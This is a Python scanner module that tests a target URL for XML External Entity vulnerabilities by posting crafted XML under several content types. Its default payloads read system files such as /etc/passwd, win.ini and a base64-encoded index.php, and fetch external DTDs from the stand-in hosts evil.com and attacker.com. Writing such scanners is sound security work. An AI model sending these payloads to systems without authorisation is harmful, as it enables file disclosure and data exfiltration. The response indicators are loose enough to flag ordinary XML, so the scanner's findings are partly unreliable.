# -*- coding: utf-8 -*-
import asyncio
from typing import List, Dict, Any
from backend.utils import get_http_client
from datetime import datetime
from backend.utils.circuit_breaker import circuit_breaker
from backend.utils.logging_config import get_context_logger
import logging

from backend.scanners.base_scanner import BaseScanner
from backend.scanners.scanner_registry import ScannerRegistry
from backend.config_types.models import ScanInput, Severity, OwaspCategory

logger = logging.getLogger(__name__)

class XxeScanner(BaseScanner):
    """
    A scanner module for detecting XML External Entity (XXE) vulnerabilities.
    """

    metadata = {
        "name": "XML External Entity (XXE)",
        "description": "Detects XXE vulnerabilities by sending crafted XML payloads.",
        "owasp_category": "A03:2021 - Injection",
        "author": "Project Echo Team",
        "version": "1.0"
    }

    async def scan(self, scan_input: ScanInput) -> List[Dict]:
        start_time = datetime.now()
        scan_id = f"{self.__class__.__name__}_{start_time.strftime('%Y%m%d_%H%M%S')}"
        try:
            logger.info("Scan started", extra={
                "scanner": self.__class__.__name__,
                "scan_id": scan_id,
                "target": scan_input.target,
                "options": scan_input.options
            })
            results = await self._perform_scan(scan_input.target, scan_input.options or {})
            self._update_metrics(True, start_time)
            logger.info("Scan completed", extra={
                "scanner": self.__class__.__name__,
                "scan_id": scan_id,
                "target": scan_input.target,
                "result_count": len(results)
            })
            return results
        except Exception as e:
            self._update_metrics(False, start_time)
            logger.error("Scan failed", extra={
                "scanner": self.__class__.__name__,
                "scan_id": scan_id,
                "target": scan_input.target,
                "error": str(e)
            }, exc_info=True)
            raise

    async def _perform_scan(self, target: str, options: Dict) -> List[Dict]:
        """
        Perform the actual XXE vulnerability scan.
        """
        findings: List[Dict] = []
        logger.info("Starting XXE scan", extra={
            "target": target,
            "scanner": self.__class__.__name__
        })

        xxe_payloads = options.get('payloads', [
            # Basic file read
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>""",

            # Parameter entity
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
            %xxe;]>
            <foo>&evil;</foo>""",

            # Out-of-band
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
            %xxe;]>
            <foo>&send;</foo>""",

            # Windows file read
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
            <foo>&xxe;</foo>""",

            # PHP wrapper
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
            <foo>&xxe;</foo>"""
        ])

        content_types = options.get('content_types', [
            'application/xml',
            'text/xml',
            'application/x-www-form-urlencoded',
            'multipart/form-data'
        ])

        indicators = [
            'root:', '/bin/bash', '/etc/passwd', 'win.ini',
            '<?php', '<?xml', 'DOCTYPE', 'ENTITY',
            'SYSTEM', 'PUBLIC', 'file://', 'http://',
            'base64', 'PD9waHA', 'PHhtbA'
        ]

        try:
            async with get_http_client(timeout=30) as client:
                for content_type in content_types:
                    headers = {"Content-Type": content_type}

                    for payload in xxe_payloads:
                        try:
                            response = await client.post(target, content=payload, headers=headers)

                            for indicator in indicators:
                                if indicator in response.text:
                                    logger.info("Potential XXE vulnerability detected", extra={
                                        "url": target,
                                        "content_type": content_type,
                                        "indicator": indicator,
                                        "scanner": self.__class__.__name__
                                    })
                                    findings.append({
                                        "type": "xxe_vulnerability",
                                        "severity": Severity.HIGH,
                                        "title": "XML External Entity (XXE) Vulnerability",
                                        "description": "Found potential XXE vulnerability. The application appears to be processing external entities in XML input.",
                                        "evidence": {
                                            "url": target,
                                            "content_type": content_type,
                                            "payload": payload,
                                            "indicator": indicator,
                                            "response_snippet": response.text[:200]
                                        },
                                        "owasp_category": OwaspCategory.INJECTION,
                                        "recommendation": "Disable XML external entity processing in your XML parser. Use a secure XML parser configuration that prevents XXE attacks. Consider using a whitelist of allowed XML features."
                                    })
                                    break

                        except Exception as e:
                            logger.warning("Error testing XXE payload", extra={
                                "url": target,
                                "content_type": content_type,
                                "payload": payload[:100],
                                "error": str(e),
                                "scanner": self.__class__.__name__
                            })
                            continue
        except Exception as e:
            logger.error("Unexpected error during XXE scan", extra={
                "target": target,
                "error": str(e),
                "scanner": self.__class__.__name__
            }, exc_info=True)

        logger.info("Finished XXE scan", extra={
            "target": target,
            "findings_count": len(findings),
            "scanner": self.__class__.__name__
        })
        return findings

    def _create_error_finding(self, description: str) -> Dict:
        return { "type": "error", "severity": Severity.INFO, "title": "XXE Error", "description": description, "location": "Scanner", "cwe": "N/A", "remediation": "N/A", "confidence": 0, "cvss": 0 }

def register(scanner_registry: ScannerRegistry) -> None:
    scanner_registry.register("xxe", XxeScanner) 
